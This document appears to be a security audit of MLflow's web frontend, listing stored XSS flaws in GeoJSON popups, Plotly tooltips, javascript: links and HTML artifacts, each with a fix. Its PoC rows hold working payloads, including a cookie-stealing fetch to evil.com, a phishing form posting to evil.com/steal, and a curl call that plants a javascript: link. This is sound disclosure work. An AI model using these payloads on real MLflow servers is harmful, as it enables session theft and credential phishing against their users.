# MLflow Frontend XSS & postMessage Security Audit

**Repository:** https://github.com/mlflow/mlflow
**Date:** 2026-03-24
**Scope:** Production frontend code under `mlflow/server/js/src/` and server-side artifact serving in `mlflow/server/`
**Methodology:** Static analysis of source code on the `master` branch via 44+ parallel research agents

---

## Executive Summary

The audit identified **6 high-confidence XSS vulnerability patterns**, **4 medium-severity issues**, and several low-severity/defense-in-depth gaps. Note: Findings 2 and 3 (Plotly hovertemplate injection) are **version-dependent** — newer MLflow versions set `useDefaultHoverBox={false}` which disables hover tooltips, preventing the XSS from triggering. The unsanitized code paths remain and should still be fixed as defense-in-depth. No postMessage handlers were found in the codebase. The most critical finding is a stored XSS via GeoJSON artifact rendering that executes in the main application origin with zero sanitization.

---

## HIGH-CONFIDENCE FINDINGS

### Finding 1: Stored XSS via GeoJSON Artifact `popupContent` (Leaflet `bindPopup`)

| Field | Value |
|-------|-------|
| **Type** | Stored XSS (DOM Sink) |
| **File** | `mlflow/server/js/src/experiment-tracking/components/artifact-view-components/ShowArtifactMapView.tsx` |
| **Attacker-controlled source** | `feature.properties.popupContent` in a user-uploaded GeoJSON artifact |
| **Sink** | `layer.bindPopup(popupContent)` — Leaflet renders the string as raw HTML via innerHTML |
| **Source→Sink path** | `mlflow.log_artifact("evil.geojson")` → server stores file → frontend `getArtifactContent()` → `JSON.parse(rawFeatures)` → `onEachFeature()` extracts `feature.properties.popupContent` → `layer.bindPopup(popupContent)` — **zero sanitization** |
| **Why sanitization fails** | No sanitization exists on this path. The `popupContent` value is passed directly from parsed JSON to Leaflet's `bindPopup()`, which interprets strings as HTML by default. |
| **Production-reachable** | YES — any user viewing a GeoJSON artifact's map view triggers this |
| **PoC** | Log a GeoJSON artifact: `{"type":"Feature","properties":{"popupContent":"<img src=x onerror='fetch(\"https://evil.com/?c=\"+document.cookie)'>"},"geometry":{"type":"Point","coordinates":[0,0]}}`. When any user views the map artifact and clicks the marker, the JS executes in the MLflow origin. |
| **Fix** | Use Leaflet's text-only API: `layer.bindPopup(document.createTextNode(popupContent))`, or sanitize with DOMPurify before passing to `bindPopup()`. |

---

### Finding 2: Stored XSS via Plotly Tooltip HTML Template Injection (Run Names)

| Field | Value |
|-------|-------|
| **Type** | Stored XSS (DOM Sink via Plotly hovertemplate) |
| **File** | `mlflow/server/js/src/experiment-tracking/components/runs-charts/components/RunsMetricsLinePlot.tsx` |
| **Attacker-controlled source** | `runEntry.runInfo?.runName` — user-settable run name |
| **Sink** | Plotly `hovertemplate` property — rendered as HTML in tooltip |
| **Source→Sink path** | User sets run name to XSS payload via API → frontend fetches run data → `createTooltipTemplate(runName)` interpolates raw `runName` into template literal: `` `<b>${runName}</b>:<br>` `` → passed as `hovertemplate` to Plotly → Plotly renders as HTML on hover |
| **Why sanitization fails** | No escaping applied. The run name is embedded via JS template literal (`${runName}`) at template construction time, not via Plotly's safe `%{...}` reference syntax. |
| **Production-reachable** | **Version-dependent.** In older MLflow versions, YES — triggers when any user hovers over a data point in the metrics line plot. In newer MLflow versions, Plotly is configured with `useDefaultHoverBox={false}`, which disables the default hover tooltip rendering and **prevents the XSS from triggering on hover**. The unsanitized template construction still exists in the code, but the sink (Plotly's HTML tooltip) is not active. |
| **PoC** | Create a run with name `<img src=x onerror=alert(document.cookie)>`, log a metric, view the line chart. On older versions, hovering over the data point triggers execution. On newer versions with `useDefaultHoverBox={false}`, the hover tooltip does not render. |
| **Fix** | Apply `lodash.escape()` to `runName` before interpolation: `` `<b>${escape(runName)}</b>:<br>` ``. The correct pattern already exists in `CompareRunScatter.tsx`. Even though newer versions mitigate via disabled hover box, the unsanitized interpolation should still be fixed as a defense-in-depth measure. |

---

### Finding 3: Stored XSS via Plotly Tooltip HTML Template Injection (Metric Keys)

| Field | Value |
|-------|-------|
| **Type** | Stored XSS (DOM Sink via Plotly hovertemplate) |
| **Files** | `mlflow/server/js/src/experiment-tracking/components/runs-charts/components/RunsContourPlot.tsx` — `` `<b>${zAxisTitle}:</b>` `` where `zAxisTitle = zAxis.key`; `mlflow/server/js/src/experiment-tracking/components/runs-charts/components/RunsMetricsBarPlot.tsx` — `` `${mKey}: %{x}` `` where `mKey` is a metric key |
| **Attacker-controlled source** | Metric/parameter key names — user-settable via `mlflow.log_metric()` / `mlflow.log_param()` API |
| **Sink** | Plotly `hovertemplate` — rendered as HTML |
| **Source→Sink path** | User logs metric with key `<img src=x onerror=alert(1)>` → frontend fetches metric data → metric key interpolated directly into HTML template string via JS template literal → Plotly renders as HTML on hover |
| **Why sanitization fails** | Same as Finding 2 — JS template literal interpolation (`${mKey}`) at construction time, no `lodash.escape()` applied |
| **Production-reachable** | **Version-dependent.** In older MLflow versions, YES — triggers on hover in contour plots and multi-metric bar plots. In newer MLflow versions, Plotly is configured with `useDefaultHoverBox={false}`, which disables the default hover tooltip rendering and **prevents the XSS from triggering on hover**. The unsanitized template construction still exists in the code, but the sink is not active. |
| **PoC** | `mlflow.log_metric("<img src=x onerror=alert(1)>", 1.0)` then view the bar chart or contour plot. On older versions, hovering triggers execution. On newer versions with `useDefaultHoverBox={false}`, the hover tooltip does not render. |
| **Fix** | Apply `lodash.escape()` to all user-controlled strings before template interpolation, matching the pattern in `CompareRunScatter.tsx`. Even with hover disabled in newer versions, fix as defense-in-depth. |

---

### Finding 4: Stored XSS via `javascript:` URI in `run_link` href

| Field | Value |
|-------|-------|
| **Type** | Stored XSS (javascript: URI injection) |
| **File** | `mlflow/server/js/src/model-registry/components/ModelVersionView.tsx` — `resolveRunLink()` method |
| **Attacker-controlled source** | `modelVersion.run_link` — set via `CreateModelVersion` API with zero validation (only `_assert_string` type check) |
| **Sink** | `<a target="_blank" href={modelVersion.run_link}>` — direct href injection |
| **Source→Sink path** | Attacker calls `POST /api/2.0/mlflow/model-versions/create` with `"run_link": "javascript:alert(document.cookie)"` → stored in DB as-is → frontend renders `<a href="javascript:alert(document.cookie)">` → user clicks link → JS executes in MLflow origin |
| **Why sanitization fails** | No URL protocol validation exists at any layer: no server-side scheme check, no client-side sanitization, no CSP. The ESLint `react/jsx-no-target-blank` rule is explicitly suppressed with a disable comment. |
| **Production-reachable** | YES — requires user click on the "Source Run" link in the model version page |
| **PoC** | `curl -X POST http://mlflow:5000/api/2.0/mlflow/model-versions/create -d '{"name":"m","source":"s3://b/m","run_link":"javascript:alert(document.cookie)"}'` — then visit the model version page and click the run link. |
| **Fix** | Validate URL scheme on both server and client. Server: reject `run_link` values not starting with `http://` or `https://`. Client: use a `sanitizeUrl()` utility that blocks `javascript:`, `data:`, `vbscript:` protocols. |

---

### Finding 4b: Stored XSS via `javascript:` URI in Dataset Source URL href

| Field | Value |
|-------|-------|
| **Type** | Stored XSS (javascript: URI injection) |
| **File** | `mlflow/server/js/src/experiment-tracking/components/experiment-page/components/runs/ExperimentViewDatasetSourceURL.tsx` |
| **Attacker-controlled source** | `dataset.source` JSON field — set via `mlflow.log_input()` API, the `url` property is extracted by `getDatasetSourceUrl()` in `DatasetUtils.ts` |
| **Sink** | `<Typography.Link href={url} openInNewTab>` — direct href injection |
| **Source→Sink path** | Attacker logs a dataset input with source JSON `{"url":"javascript:alert(document.cookie)","type":"http"}` via `mlflow.log_input()` → stored in DB → frontend calls `getDatasetSourceUrl()` which extracts `parsed.url` for `HTTP` and `EXTERNAL` source types → passed directly to `<Typography.Link href={url}>` → user clicks link → JS executes in MLflow origin |
| **Why sanitization fails** | No URL protocol validation exists. `getDatasetSourceUrl()` returns `parsed.url ?? null` directly for HTTP/EXTERNAL types. No scheme check, no `isValidHttpUrl()` call, no CSP. |
| **Production-reachable** | YES — requires user click on the dataset source URL link in the runs table |
| **PoC** | Log a dataset with HTTP source type and `javascript:` URL, then view the experiment runs table and click the source link. |
| **Fix** | Apply `isValidHttpUrl()` validation (already exists in `Utils.tsx`) before rendering the URL in an href. Block `javascript:`, `data:`, `vbscript:` protocols. |

---

### Finding 5: HTML Artifact Rendering — Arbitrary JS Execution in Sandboxed iframe

| Field | Value |
|-------|-------|
| **Type** | Stored XSS (sandboxed — partial impact) |
| **File** | `mlflow/server/js/src/experiment-tracking/components/artifact-view-components/ShowArtifactHtmlView.tsx` |
| **Attacker-controlled source** | HTML artifact content uploaded via `mlflow.log_artifact()` |
| **Sink** | `new Blob([code], { type: 'text/html' })` → `URL.createObjectURL(blob)` → `<Iframe src={blobURL} sandbox="allow-scripts">` |
| **Source→Sink path** | Attacker logs malicious `.html` artifact → server stores file → frontend `getArtifactContent()` fetches raw HTML as string → stored in `this.state.html` with zero sanitization → wrapped in Blob with `text/html` type → blob URL loaded in iframe with `sandbox="allow-scripts"` |
| **Why sanitization fails** | No sanitization exists. Raw HTML is loaded directly. The only protection is iframe sandboxing. |
| **Production-reachable** | YES — triggers when any user views an HTML artifact in the artifact viewer |
| **Mitigations in place** | `sandbox="allow-scripts"` without `allow-same-origin` means the iframe runs in an opaque origin — it cannot access parent page cookies, localStorage, or DOM. Server also sets `Content-Disposition: attachment` on direct artifact fetches. |
| **Residual impact** | Arbitrary JS executes inside the sandbox: phishing UI overlays, crypto mining, outbound data exfiltration via fetch to attacker server, redirect attacks. If `allow-same-origin` is ever added alongside `allow-scripts`, this becomes critical same-origin XSS. |
| **PoC** | Log `evil.html` containing `<script>document.body.innerHTML='<h1>Enter credentials</h1><form action="https://evil.com/steal"><input name=u><input name=p type=password><button>Login</button></form>'</script>`. Artifact viewer renders a convincing phishing page. |
| **Fix** | Add `sandbox="allow-scripts"` as a proper attribute (verify `react-iframe` correctly propagates it). Consider using `srcdoc` with DOMPurify sanitization instead of blob URLs. Add CSP `frame-src blob:` restrictions. |

---

## MEDIUM-SEVERITY FINDINGS

### Finding 6: `iframe` Tag in sanitize-html Allowlist (Latent XSS Risk)

| Field | Value |
|-------|-------|
| **Type** | Misconfiguration / Latent XSS |
| **File** | `mlflow/server/js/src/common/utils/MarkdownUtils.ts` — `sanitizerOptions.allowedTags` includes `'iframe'` |
| **Detail** | The `iframe` tag is explicitly in the allowlist. Currently, no `iframe` attributes are whitelisted so `<iframe src="...">` is stripped to `<iframe></iframe>` (inert). However, this is fragile: any future addition of `src` or `srcdoc` to allowed attributes, or a `sanitize-html` bypass (CVE-2021-26539 covers exactly this for `srcdoc`), converts this to immediate stored XSS. |
| **Fix** | Remove `'iframe'` from `allowedTags`. |

### Finding 7: Outdated sanitize-html (v1.x) with Known CVEs

| Field | Value |
|-------|-------|
| **Type** | Vulnerable dependency |
| **File** | `mlflow/server/js/package.json` — `"sanitize-html": "^1.18.5"` (resolves to 1.27.5) |
| **CVEs** | CVE-2021-26539 (iframe srcdoc bypass), CVE-2021-26540 (style attribute bypass), CVE-2024-21501 (ReDoS + sanitization bypass). Fixes are in 2.x only; `^1.x` semver constraint blocks auto-upgrade. |
| **Impact** | Combined with Finding 6 (iframe in allowlist) and the fact that sanitized HTML flows to `dangerouslySetInnerHTML` in `EditableNote.tsx`, a sanitize-html bypass could enable stored XSS through experiment/run/model descriptions. |
| **Fix** | Upgrade `sanitize-html` to latest 2.x and remove `iframe` from allowlist. |

### Finding 8: Identity-Function Default in GenAI MarkdownConverter Context

| Field | Value |
|-------|-------|
| **Type** | Dangerous default / Defense-in-depth failure |
| **File** | `mlflow/server/js/src/shared/web-shared/genai-traces-table/utils/MarkdownUtils.tsx` |
| **Detail** | The React context default for `makeHTML` is `(markdown?) => markdown` — an identity function with zero sanitization. Five components consume this context and pass results to `dangerouslySetInnerHTML`. Currently, all production call sites wrap with `MarkdownConverterProvider` that supplies a sanitizing implementation, so this is not actively exploitable. However, any future component rendering `EvaluationsReviewTextBox` outside the provider tree gets full stored XSS. |
| **Affected components** | `EvaluationsReviewTextBox.tsx`, `EvaluationsReviewAssessmentDetailedHistory.tsx`, `EvaluationsReviewRetrievalSection.tsx`, `EvaluationsReviewAssessments.tsx`, `EvaluationsReviewAssessmentTag.tsx` |
| **Fix** | Change the default to throw an error or use `sanitize-html` as a safe fallback. |

### Finding 9: Missing `rel="noopener noreferrer"` on Target Blank Links

| Field | Value |
|-------|-------|
| **Type** | Reverse tabnabbing |
| **File** | `mlflow/server/js/src/common/utils/MarkdownUtils.ts` — `forceAnchorTagNewTab()` |
| **Detail** | Regex adds `target="_blank"` but not `rel="noopener noreferrer"`: `html.replace(/<a/g, '<a target="_blank"')`. This allows the opened page to access `window.opener` and redirect the MLflow tab (reverse tabnabbing). Also applies to `ModelVersionView.tsx`'s `run_link` (ESLint rule explicitly disabled). |
| **Fix** | Change to `'<a target="_blank" rel="noopener noreferrer"'`. |

---

## LOW-SEVERITY FINDINGS

### Finding 10: No Content-Security-Policy Header

- **Files:** `mlflow/server/security.py`, `mlflow/server/fastapi_security.py`
- No CSP header is set anywhere. Every XSS finding above is directly exploitable without browser-level mitigation.
- `X-Frame-Options` is off by default (only set if `MLFLOW_SERVER_X_FRAME_OPTIONS` env var configured).
- Only `X-Content-Type-Options: nosniff` is set by default.

### Finding 11: `data:` URIs Allowed in Markdown Renderers

- Both `sanitize-html` (default `allowedSchemes`) and `GenAIMarkdownRenderer.tsx` (explicit `urlTransform`) allow `data:` URIs on image/link sources. Not directly exploitable for script execution via `<img>`, but enables content injection.

### Finding 12: Outdated Showdown Markdown Library (v1.x)

- **File:** `mlflow/server/js/package.json` — `"showdown": "^1.8.6"` (resolves to 1.9.1)
- CVE-2022-25854: XSS via crafted markdown. Combined with the vulnerable sanitize-html, creates a dual-vulnerability chain where Showdown's malicious output may survive sanitization.

### Finding 13: SVG Blob URL Memory Leak

- **File:** `ShowArtifactImageView.tsx` — `URL.createObjectURL()` is called but never revoked. SVGs rendered via `<img>` are safe (blocks script execution), but the blob URL leaks memory.

---

## postMessage HANDLER SUMMARY

| Item | Detail |
|------|--------|
| **Total postMessage handlers found** | **0** |
| **`window.addEventListener('message', ...)`** | None in production code |
| **`window.onmessage`** | None |
| **`postMessage()` calls** | None sending sensitive data |
| **Message-related code** | Only SharedWorker `MessagePort` (same-origin) and SSE `EventSource` — not postMessage |
| **Verdict** | **No postMessage attack surface exists in the MLflow frontend.** |

---

## AREAS CONFIRMED SAFE

| Area | Why Safe |
|------|----------|
| **AG Grid / table rendering** | All user data rendered as React text nodes with automatic HTML escaping |
| **React Router parameters** | All benefit from JSX auto-escaping |
| **Search highlighting** | Uses React `<mark>` elements, not innerHTML |
| **`eval()` / `new Function()`** | None in production code (only in vendored Monaco editor) |
| **jQuery** | Not present in production code |
| **Artifact download endpoint** | Sets `Content-Disposition: attachment` + `X-Content-Type-Options: nosniff` on all artifact-serving endpoints |
| **localStorage/sessionStorage→DOM** | No storage values flow to innerHTML/dangerouslySetInnerHTML; all consumed as React state or HTTP headers |
| **Cookie values** | Only used for HTTP request headers, not DOM sinks |
| **`RunsScatterPlot.tsx`** | All user data referenced via Plotly's safe `%{...}` syntax, not template construction |
| **`ShowArtifactTextView.tsx`** | Uses React/Prism auto-escaping |
| **`ShowArtifactPdfView.tsx`** | Canvas rendering with text/annotation layers disabled |
| **`ShowArtifactTableView.tsx`** | React JSX escaping, no innerHTML |

---

## RECOMMENDED FIXES (Priority Order)

1. **[Critical]** Sanitize GeoJSON `popupContent` in `ShowArtifactMapView.tsx` — use `document.createTextNode()` or DOMPurify
2. **[Critical → Medium in newer versions]** Apply `lodash.escape()` to all user-controlled strings in Plotly hovertemplates (`RunsMetricsLinePlot.tsx`, `RunsContourPlot.tsx`, `RunsMetricsBarPlot.tsx`) — mitigated in newer MLflow by `useDefaultHoverBox={false}` but still recommended as defense-in-depth
3. **[Critical]** Add URL protocol validation for `run_link` in `ModelVersionView.tsx` and dataset source URLs in `ExperimentViewDatasetSourceURL.tsx` — block `javascript:`, `data:`, `vbscript:`
4. **[High]** Add Content-Security-Policy header in `security.py` / `fastapi_security.py`
5. **[High]** Upgrade `sanitize-html` from `^1.18.5` to latest 2.x
6. **[High]** Remove `iframe` from `allowedTags` in `MarkdownUtils.ts`
7. **[Medium]** Change MarkdownConverter context default to throw or use safe fallback
8. **[Medium]** Add `rel="noopener noreferrer"` in `forceAnchorTagNewTab()`
9. **[Medium]** Upgrade `showdown` from `^1.8.6` to 2.x, or migrate to `react-markdown`
10. **[Low]** Add server-side URL validation for `run_link` in `CreateModelVersion` handler
11. **[Low]** Enable `X-Frame-Options` by default; add HSTS, Referrer-Policy headers
